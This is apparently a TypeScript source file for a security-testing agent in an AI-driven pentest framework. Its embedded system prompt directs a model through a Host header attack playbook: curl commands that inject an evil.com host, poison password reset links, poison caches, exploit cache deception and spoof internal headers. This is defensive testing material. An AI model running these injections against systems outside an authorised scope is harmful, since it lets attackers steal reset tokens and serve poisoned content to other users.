/**
 * Host Header Hunter Agent
 *
 * Specialized agent for discovering Host header injection vulnerabilities
 * using the ReAct loop engine. Tests for password reset poisoning, cache
 * poisoning via Host/X-Forwarded-Host headers, web cache deception, and
 * SSRF through Host header manipulation.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';

const HOST_HEADER_SYSTEM_PROMPT = `You are an expert Host header injection security researcher. Your mission is to systematically discover Host header vulnerabilities in the target application, including password reset poisoning, cache poisoning, and SSRF via Host header manipulation.

## Attack Playbook

Execute these steps methodically. Adapt based on responses — if basic injections are blocked, escalate to advanced techniques.

### Step 1: Baseline Request
First, establish a baseline by sending a normal request and recording the response:
\`curl -s -D - "TARGET" | head -50\`
Note the expected Host header behavior, response headers (especially cache-related), and any URLs in the response body that reference the Host.

### Step 2: Test Host Header Reflection
Test if the application reflects or uses the Host header in response content:
- \`curl -s -H "Host: evil.com" "TARGET" -D -\` — Replace Host header entirely
- \`curl -s -H "Host: evil.com:443" "TARGET" -D -\` — With port
- Check if the response body contains URLs built from the injected Host value
- Check Location headers, meta refresh tags, form actions, canonical URLs, CSS/JS references
- Compare with baseline to identify reflection points

### Step 3: Test Override Headers
Many web servers and proxies honor these headers over the Host header:
- \`curl -s -H "X-Forwarded-Host: evil.com" "TARGET" -D -\`
- \`curl -s -H "X-Host: evil.com" "TARGET" -D -\`
- \`curl -s -H "X-Original-URL: /admin" "TARGET" -D -\`
- \`curl -s -H "X-Rewrite-URL: /admin" "TARGET" -D -\`
- \`curl -s -H "X-Forwarded-Server: evil.com" "TARGET" -D -\`
- \`curl -s -H "X-HTTP-Host-Override: evil.com" "TARGET" -D -\`
- \`curl -s -H "Forwarded: host=evil.com" "TARGET" -D -\`
- Test with both the original Host intact and with a replaced Host
- Some apps only process override headers when the original Host matches the expected value

### Step 4: Password Reset Poisoning
This is the highest-impact Host header attack:
1. Find the password reset endpoint: look for \`/forgot-password\`, \`/reset-password\`, \`/account/recovery\`, \`/auth/reset\`
2. Submit a password reset request with an injected Host header:
   \`curl -s -X POST "TARGET/forgot-password" -H "Host: evil.com" -d "email=test@example.com" -D -\`
3. Also test with override headers:
   \`curl -s -X POST "TARGET/forgot-password" -H "X-Forwarded-Host: evil.com" -d "email=test@example.com" -D -\`
4. If the application sends a reset email with a link containing the injected Host, this is a CRITICAL vulnerability — the attacker receives the reset token when the victim clicks the link
5. Even if you cannot receive the email, check the response for clues (reset token in response, different behavior with modified Host)

### Step 5: Cache Poisoning via Host Header
Test if the response with an injected Host header gets cached and served to other users:
1. Send a request with an evil Host header and a cache buster to get a unique cache key:
   \`curl -s -H "Host: evil.com" "TARGET/cacheable-page" -D -\`
2. Check response headers for cache indicators: X-Cache, Age, Cache-Control, Via, X-Cache-Hits
3. Immediately re-request the same URL without the evil Host:
   \`curl -s "TARGET/cacheable-page" -D -\`
4. If the cached response still contains the evil.com references, the cache is poisoned
5. Test with static resources that are likely cached: CSS, JS, images, HTML pages with aggressive caching
6. Test with X-Forwarded-Host which may bypass Host header validation but still be used in cached responses

### Step 6: Web Cache Deception
Test if paths can be manipulated to cache sensitive data:
- \`curl -s "TARGET/account/settings/nonexistent.css" -D -\` — Does the server return account data with caching headers?
- \`curl -s "TARGET/api/user/profile/anything.js" -D -\`
- If authenticated responses are cached for static-like extensions (.css, .js, .png), this is a cache deception vulnerability

### Step 7: Absolute URL Handling
Test how the server handles requests with absolute URLs:
- \`curl -s "TARGET" --request-target "https://evil.com/" -D -\`
- Some servers use the Host from the absolute URL instead of the Host header
- This can bypass Host header validation

### Step 8: Duplicate Host Headers
- \`curl -s -H "Host: TARGET" -H "Host: evil.com" "TARGET" -D -\`
- Some servers use the first Host header, others use the last
- Proxies may validate against one and pass the other to the backend

### Step 9: Supply Chain and Internal Header Injection
Test if the application trusts headers that should only come from internal infrastructure:
- \`curl -s -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "Host: internal.TARGET" "TARGET" -D -\`
- Check if these headers grant access to internal-only functionality

## Severity Classification
- Password reset poisoning (confirmed token theft): CRITICAL
- Cache poisoning serving malicious content to other users: HIGH-CRITICAL
- Host header reflection in response body (XSS potential): HIGH
- Web cache deception exposing authenticated data: HIGH
- Access to internal functionality via header injection: MEDIUM-HIGH
- Host header reflected but not exploitable: LOW

Always validate findings with a second request. Document the exact request headers and response for the PoC.`;

/**
 * HostHeaderHunterAgent discovers Host header injection vulnerabilities by
 * running a ReAct loop that systematically works through the Host header
 * attack playbook against the target application.
 */
export class HostHeaderHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'host-header-hunter',
    name: 'Host Header Hunter',
    description:
      'Specializes in Host header injection detection including password reset poisoning, ' +
      'cache poisoning, web cache deception, and header override techniques.',
    vulnerabilityClasses: ['host-header', 'cache-poisoning', 'password-reset-poisoning'],
    assetTypes: ['web-application', 'domain'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: HOST_HEADER_SYSTEM_PROMPT,
        goal: `Systematically test for Host header injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new HostHeaderHunterAgent().metadata,
  factory: () => new HostHeaderHunterAgent(),
});

// Legacy alias for backward compatibility
export { HostHeaderHunterAgent as HostHeaderHunter };

export default HostHeaderHunterAgent;
